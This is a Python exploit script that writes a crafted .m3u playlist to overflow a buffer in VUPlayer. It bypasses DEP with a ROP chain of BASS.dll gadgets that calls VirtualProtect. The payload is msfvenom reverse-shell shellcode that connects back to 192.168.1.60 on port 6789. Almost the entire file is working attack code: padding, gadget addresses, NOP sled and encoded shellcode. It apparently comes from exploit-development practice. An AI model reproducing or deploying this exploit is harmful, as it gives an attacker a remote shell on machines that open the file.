import sys
import struct
import os

crash_file = "vuplayer-dep.m3u"

# 
#GOALS - VirtualProtect
#EAX 90909090 => Nop           {DONE}                                   
#ECX <writeable pointer> => lpflOldProtect   {DONE}                              
#EDX 00000040 => flNewProtect     {DONE}                               
#EBX 00000201 => dwSize   {DONE}                                      
#ESP ???????? => Leave as is                                 
#EBP ???????? => Call to ESP (jmp, call, push,..) -> !py mona jmp -r esp -cpb '\x00'  {DONE}              
#ESI ???????? => PTR to VirtualProtect - DWORD PTR of VirtualProtect (0x10040284){DONE} 
#EDI RETN => ROP-Nop same as EIP  --> !py mona find -type instr -s "retn" -m modulo.dll -cpb "\x00" {DONE} 

#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.60 LPORT=6789  -f python -v shellcode -b '\x00\x09\x0a\x0d\x1a' EXITFUNC=thread
shellcode =  b""
shellcode += b"\xda\xc2\xd9\x74\x24\xf4\x58\x2b\xc9\xbb\xc4"
shellcode += b"\xba\xa4\xd4\xb1\x52\x83\xc0\x04\x31\x58\x13"
shellcode += b"\x03\x9c\xa9\x46\x21\xe0\x26\x04\xca\x18\xb7"
shellcode += b"\x69\x42\xfd\x86\xa9\x30\x76\xb8\x19\x32\xda"
shellcode += b"\x35\xd1\x16\xce\xce\x97\xbe\xe1\x67\x1d\x99"
shellcode += b"\xcc\x78\x0e\xd9\x4f\xfb\x4d\x0e\xaf\xc2\x9d"
shellcode += b"\x43\xae\x03\xc3\xae\xe2\xdc\x8f\x1d\x12\x68"
shellcode += b"\xc5\x9d\x99\x22\xcb\xa5\x7e\xf2\xea\x84\xd1"
shellcode += b"\x88\xb4\x06\xd0\x5d\xcd\x0e\xca\x82\xe8\xd9"
shellcode += b"\x61\x70\x86\xdb\xa3\x48\x67\x77\x8a\x64\x9a"
shellcode += b"\x89\xcb\x43\x45\xfc\x25\xb0\xf8\x07\xf2\xca"
shellcode += b"\x26\x8d\xe0\x6d\xac\x35\xcc\x8c\x61\xa3\x87"
shellcode += b"\x83\xce\xa7\xcf\x87\xd1\x64\x64\xb3\x5a\x8b"
shellcode += b"\xaa\x35\x18\xa8\x6e\x1d\xfa\xd1\x37\xfb\xad"
shellcode += b"\xee\x27\xa4\x12\x4b\x2c\x49\x46\xe6\x6f\x06"
shellcode += b"\xab\xcb\x8f\xd6\xa3\x5c\xfc\xe4\x6c\xf7\x6a"
shellcode += b"\x45\xe4\xd1\x6d\xaa\xdf\xa6\xe1\x55\xe0\xd6"
shellcode += b"\x28\x92\xb4\x86\x42\x33\xb5\x4c\x92\xbc\x60"
shellcode += b"\xc2\xc2\x12\xdb\xa3\xb2\xd2\x8b\x4b\xd8\xdc"
shellcode += b"\xf4\x6c\xe3\x36\x9d\x07\x1e\xd1\x62\x7f\x21"
shellcode += b"\x1d\x0b\x82\x21\x47\x4e\x0b\xc7\x1d\x40\x5a"
shellcode += b"\x50\x8a\xf9\xc7\x2a\x2b\x05\xd2\x57\x6b\x8d"
shellcode += b"\xd1\xa8\x22\x66\x9f\xba\xd3\x86\xea\xe0\x72"
shellcode += b"\x98\xc0\x8c\x19\x0b\x8f\x4c\x57\x30\x18\x1b"
shellcode += b"\x30\x86\x51\xc9\xac\xb1\xcb\xef\x2c\x27\x33"
shellcode += b"\xab\xea\x94\xba\x32\x7e\xa0\x98\x24\x46\x29"
shellcode += b"\xa5\x10\x16\x7c\x73\xce\xd0\xd6\x35\xb8\x8a"
shellcode += b"\x85\x9f\x2c\x4a\xe6\x1f\x2a\x53\x23\xd6\xd2"
shellcode += b"\xe2\x9a\xaf\xed\xcb\x4a\x38\x96\x31\xeb\xc7"
shellcode += b"\x4d\xf2\x0b\x2a\x47\x0f\xa4\xf3\x02\xb2\xa9"
shellcode += b"\x03\xf9\xf1\xd7\x87\x0b\x8a\x23\x97\x7e\x8f"
shellcode += b"\x68\x1f\x93\xfd\xe1\xca\x93\x52\x01\xdf"

rop_nop = struct.pack("<I",0x10010158) # retn from bass.dll

#EAX {DONE}
eax = struct.pack("<I",0x10015f82) # POP EAX # RETN    ** [BASS.dll] ** 
eax += struct.pack("<I",0x90909090) #sled

#ECX {DONE}
ecx = struct.pack("<I",0x10601064)  # POP ECX # RETN    ** [BASSMIDI.dll] ** 
ecx += struct.pack("<I",0x1003f010)  #RW address

#EDX
edx = struct.pack("<I",0x10015f82)  # POP EAX # RETN    ** [BASS.dll] ** 
edx += struct.pack("<I",0xffffffc0) # -40
edx += struct.pack("<I",0x10014db4)  # NEG EAX # RETN    ** [BASS.dll] **  
edx += struct.pack("<I",0x10038a6c)  # XCHG EAX,EDX # RETN    ** [BASS.dll] ** 

#EBX
ebx = struct.pack("<I",0x10015f82)  # POP EAX # RETN    ** [BASS.dll] ** 
ebx += struct.pack("<I",0x994801bc) # 0x994801bc XOR 0x994803BD = 201
ebx += struct.pack("<I",0x1003a074)  # XOR EAX,994803BD # RETN    ** [BASS.dll] **
ebx += struct.pack("<I",0x10032f32)  # XCHG EAX,EBX # RETN 0x00    ** [BASS.dll] **

#EBP
ebp = struct.pack("<I",0x1001d892)  # POP EBP # RETN    ** [BASS.dll] **   |  
ebp += struct.pack("<I",0x100222c5)  # jmp esp

#ESI
esi = struct.pack('<I',0x10015f82) # POP EAX # RETN    ** [BASS.dll] ** 
esi += struct.pack('<I', 0x10040284)    # virtual protect pointer 
esi += struct.pack('<I', 0x1001eaf1)  # MOV EAX,DWORD PTR [EAX] # RETN   
esi += struct.pack('<I', 0x10030950)  # XCHG EAX,ESI # RETN    ** [BASS.dll] **

#EDI
edi = struct.pack('<I',0x1001dc04) # POP EDI # RETN    ** [BASS.dll] ** 
edi += rop_nop

pushad = struct.pack("<I",0x1001d7a5)  # PUSHAD # RETN    ** [BASS.dll] *

rop = edx
rop += esi
rop += ebx 
rop += ebp
rop += edi
rop += eax
rop += ecx
rop += pushad

nops = b"\x90" * 16

fuzz = b"A" * 1012
fuzz += rop_nop
fuzz += rop
fuzz += nops
fuzz += shellcode
fuzz += b"C" * (3000 - len(fuzz))

makedafile = open(crash_file, "wb")
makedafile.write(fuzz)
makedafile.close()
